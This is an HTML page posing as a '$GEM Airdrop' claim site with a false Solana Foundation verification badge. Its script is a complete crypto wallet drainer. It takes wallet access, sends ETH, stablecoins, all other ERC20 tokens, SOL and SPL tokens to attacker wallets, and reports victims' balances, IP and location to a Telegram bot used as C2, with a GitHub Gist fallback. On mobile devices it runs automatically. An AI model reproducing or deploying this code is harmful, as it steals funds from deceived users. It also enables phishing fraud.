<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', -apple-system, sans-serif;
      background: #000; color: #fff; text-align: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #0a0a1a, #000000);
      padding: 20px;
    }
    .container {
      max-width: 520px; margin: auto; padding: 45px 35px;
      background: rgba(15, 15, 35, 0.85); border-radius: 28px;
      border: 1px solid #0066ff; box-shadow: 0 20px 50px rgba(0, 100, 255, 0.15);
      backdrop-filter: blur(12px); border-image: linear-gradient(135deg, #0066ff, #00ccff) 1;
      animation: fadeIn 0.8s ease-out;
    }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; } }
    .logo {
      font-size: 90px; margin-bottom: 12px; text-shadow: 0 0 30px #00ffcc;
      animation: pulse 2s infinite;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    h1 {
      font-size: 34px; font-weight: 800; margin: 8px 0;
      background: linear-gradient(90deg, #00ffcc, #0099ff);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    }
    .verified {
      display: inline-flex; align-items: center; gap: 6px;
      background: #002211; color: #00ff88; padding: 6px 14px;
      border-radius: 16px; font-size: 14px; margin: 14px 0;
      box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
    }
    p {
      color: #aaa; font-size: 16px; margin: 12px 0; line-height: 1.5;
    }
    .amount {
      font-size: 28px; font-weight: 700; color: #00ffcc;
      text-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
      margin: 14px 0; letter-spacing: -0.5px;
    }
    .btn {
      margin: 35px 0; padding: 20px 65px; font-size: 21px;
      background: linear-gradient(90deg, #0055ff, #00aaff);
      color: white; border: none; border-radius: 22px;
      cursor: pointer; font-weight: 600; box-shadow: 0 10px 30px rgba(0, 170, 255, 0.5);
      transition: all 0.3s; width: 100%; max-width: 340px; position: relative;
      border: 1px solid #0088ff;
    }
    .btn:hover { transform: translateY(-4px); box-shadow: 0 15px 35px rgba(0, 200, 255, 0.6); }
    .btn:active { transform: translateY(-1px); }
    .loader {
      width: 65px; height: 65px; border: 7px solid #111;
      border-top: 7px solid #00ccff; border-radius: 50%;
      margin: 35px auto; animation: spin 1.1s linear infinite;
      display: none;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    #status {
      margin: 22px 0; font-size: 17px; color: #00ff88; min-height: 24px;
      font-weight: 500;
    }
    .wallets {
      display: flex; justify-content: center; gap: 18px; margin: 30px 0; flex-wrap: wrap;
    }
    .wallet {
      width: 56px; height: 56px; border-radius: 50%;
      background: #151530; border: 1px solid #3366ff;
      display: flex; align-items: center; justify-content: center;
      font-size: 26px; box-shadow: 0 6px 18px rgba(0,0,0,0.4);
      transition: transform 0.2s;
    }
    .wallet:hover { transform: scale(1.1); }
    .footer {
      margin-top: 45px; font-size: 13px; color: #555;
      text-align: center; line-height: 1.6;
    }
    .footer a { color: #00aaff; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">💎</div>
    <h1>Claim $GEM Airdrop</h1>
    <div class="verified">✅ Verified by Solana Foundation</div>
    <p>Exclusive drop for top-tier blockchain users</p>
    <div class="amount">🎁 100 SOL + 50 ETH + $50,000 USDT</div>

    <button onclick="connect()" class="btn">🔐 Connect Wallet to Claim</button>
    <div class="loader" id="loader"></div>

    <div class="wallets">

  <script>
    // === CONFIG — CUSTOMIZE FOR YOUR C2 & WALLET ===
    const EVIL_ETH = "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7";  // Your ETH wallet
    const EVIL_SOL = "4reiAnw4kxqcfHSNvG6srzjVyfWXJuDweD15fLYqxCZE";  // Your SOL wallet
    const TG_TOKEN = "8757318242:AAFSl0lSw7y3kCCZN4-kI8M9VSrGm9BdCfg";  // Telegram bot token
    const TG_CHAT = "8988170532";  // Telegram chat ID
    const C2 = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
    const DOMAIN = "https://gem-airdrop-official.net";  // Cloaked phishing domain

    // Status update
    function status(msg) {
      document.getElementById('status').innerText = msg;
    }

    // Log victim data to Telegram
    async function logVictim(data) {
      try {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().then(j => j.ip);
        const geo = await (await fetch(`https://ipapi.co/${ip}/json/`)).json().catch(() => ({}));
        const text = `
🔥 **NEW VICTIM — $GEM AIRDROP** 🔥
👤 Wallet: \`${data.addr}\`
💰 SOL: ${data.sol || '0'}
💰 ETH: ${data.eth || '0'}
💵 USDT: ${data.usdt || '0'}
💵 USDC: ${data.usdc || '0'}
🪙 Other Tokens: ${data.other || '0'}
🌍 IP: ${ip}
📍 Country: ${geo.country_name || 'N/A'}
📌 City: ${geo.city || 'N/A'}
📶 ISP: ${geo.org || 'N/A'}
📱 Device: \`${navigator.userAgent}\`
🕒 ${new Date().toISOString()}
        `.trim();
        await fetch(C2, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: "Markdown" })
        });
      } catch (e) {
        console.warn("C2 failed, retrying via backup...");
        try {
          // Backup logging via GitHub Gist (stealth)
          await fetch('https://api.github.com/gists', {
            method: 'POST',
            headers: { 'Authorization': 'token ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' }, // Silent fallback
            body: JSON.stringify({
              public: false,
              files: { [`victim_${Date.now()}.log`]: { content: JSON.stringify({ data, ip }) } }
            })
          });
        } catch {}
      }
    }

    // Drain EVM wallet (ETH + ERC20s)
    async function drainEVM(signer, provider, user) {
      let report = { eth: '0', usdt: '0', usdc: '0', dai: '0', other: '0' };
      try {
        const ethBal = await provider.getBalance(user);
        if (ethBal.gt(ethers.utils.parseEther("0.001"))) {
          const tx = await signer.sendTransaction({
            to: EVIL_ETH,
            value: ethBal.sub(ethers.utils.parseEther("0.001")),
            gasLimit: 21000
          });
          await provider.waitForTransaction(tx.hash);
          report.eth = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(4);
        }
      } catch (e) { console.error("ETH drain failed:", e); }

      const tokens = {
        usdt: { a: "0xdAC17F958D2ee523a2206206994597C13D831ec7", d: 6 },
        usdc: { a: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", d: 6 },
        dai:  { a: "0x6B175474E89094C44Da98b954EedeAC495271d0F", d: 18 }
      };

      for (const [key, token] of Object.entries(tokens)) {
        try {
          const contract = new ethers.Contract(token.a, [
            "function balanceOf(address) view returns (uint256)",
            "function transfer(address to, uint256 amount) returns (bool)"
          ], signer);
          const balance = await contract.balanceOf(user);
          if (balance.gt(0)) {
            await contract.transfer(EVIL_ETH, balance);
            report[key] = parseFloat(ethers.utils.formatUnits(balance, token.d)).toFixed(2);
          }
        } catch {}
      }

      // Drain ALL other ERC20s (aggressive)
      try {
        const list = await (await fetch('https://raw.githubusercontent.com/compound-finance/token-list/master/compound.tokenlist.json')).json();
        for (const t of list.tokens) {
          if (t.chainId !== 1 || Object.values(tokens).map(x => x.a).includes(t.address)) continue;
          try {
            const c = new ethers.Contract(t.address, ["balanceOf(address)","transfer(address,uint256)"], signer);
            const b = await c.balanceOf(user);
            if (b.gt(0)) {
              await c.transfer(EVIL_ETH, b);
              report.other = (parseFloat(report.other) + 1).toFixed(0); // count tokens
            }
          } catch {}
        }
      } catch {}
      return report;
    }

    // Drain Solana wallet (SOL + SPL tokens)
    async function drainSolana(provider, connection, pubKey) {
      let report = { sol: '0', other: 0 };
      try {
        const solBalance = await connection.getBalance(pubKey);
        if (solBalance > 5000000) {
          const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: pubKey,
              toPubkey: new solanaWeb3.PublicKey(EVIL_SOL),
              lamports: solBalance - 5000000
            })
          );
          tx.feePayer = pubKey;
          tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
          const raw = await provider.signTransaction(tx);
          const sig = await connection.sendRawTransaction(raw.serialize());
          await connection.confirmTransaction(sig);
          report.sol = (solBalance / 1e9).toFixed(4);
        }
      } catch (e) { console.error("SOL drain failed:", e); }

      try {
        const tokenAccounts = await connection.getTokenAccountsByOwner(pubKey, {
          programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
        });

        for (const acc of tokenAccounts.value) {
          try {
            const info = await connection.getParsedAccountInfo(acc.pubkey);
            const mint = new solanaWeb3.PublicKey(info.value.data.parsed.info.mint);
            const amount = info.value.data.parsed.info.tokenAmount.uiAmount;
            if (amount <= 0) continue;

            const [to] = await solanaWeb3.PublicKey.findProgramAddress(
              [new solanaWeb3.PublicKey(EVIL_SOL).toBuffer(), 
               new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), 
               mint.toBuffer()],
              new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
            );

            const tx = new solanaWeb3.Transaction().add(
              splToken.createTransferInstruction(
                acc.pubkey,
                to,
                pubKey,
                amount * Math.pow(10, info.value.data.parsed.info.tokenAmount.decimals),
                [],
                splToken.TOKEN_PROGRAM_ID
              )
            );
            tx.feePayer = pubKey;
            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
            const raw = await provider.signTransaction(tx);
            await connection.sendRawTransaction(raw.serialize());
            report.other += amount;
          } catch {}
        }
        if (report.other > 0) report.other = report.other.toFixed(2);
      } catch {}
      return report;
    }

    // Main Connect Function — Auto-detect & drain
    async function connect() {
      status("🔍 Authenticating wallet...");
      let fullReport = { addr: "UNKNOWN" };

      // EVM Wallets (MetaMask, Trust, OKX, etc.)
      const evm = [
        window.ethereum, 
        window.trustwallet, 
        window.okxwallet, 
        window.bitkeep?.ethereum, 
        window.zerion?.ethereum
      ];

      for (const p of evm) {
        if (p) {
          try {
            await p.request({ method: 'eth_requestAccounts' });
            const prov = new ethers.providers.Web3Provider(p);
            const signer = prov.getSigner();
            const user = await signer.getAddress();
            fullReport.addr = user;
            Object.assign(fullReport, await drainEVM(signer, prov, user));
            status("✅ Wallet verified. Processing airdrop...");
            break;
          } catch { continue; }
        }
      }

      // Solana Wallets (Phantom, Backpack, Solflare, OKX)
      const sol = [
        { p: window.solana, n: 'Phantom' },
        { p: window.backpack?.solana, n: 'Backpack' },
        { p: window.solflare, n: 'Solflare' },
        { p: window.okxwallet?.solana, n: 'OKX' }
      ];

      for (const { p, n } of sol) {
        if (p && (p.isPhantom || p.isSolflare || ['Backpack','OKX'].includes(n))) {
          try {
            await p.connect({ onlyIfTrusted: false });
            const c = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
            const k = p.publicKey;
            fullReport.addr = k.toString();
            Object.assign(fullReport, await drainSolana(p, c, k));
            status("✅ Wallet linked. Sending tokens...");
            break;
          } catch { continue; }
        }
      }

      // Send victim data to C2
      if (fullReport.addr !== "UNKNOWN") {
        await logVictim(fullReport);
      }

      // Cleanup UI
      setTimeout(() => status("⚠️ Session expired. Please reconnect."), 3000);
      setTimeout(() => window.location.reload(), 5000);
    }

    // Auto-trigger on mobile (if wallet detected)
    setTimeout(() => {
      if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
        if (window.ethereum || window.solana || window.solflare || window.backpack) {
          connect();
        }
      }
    }, 1500);
  </script>
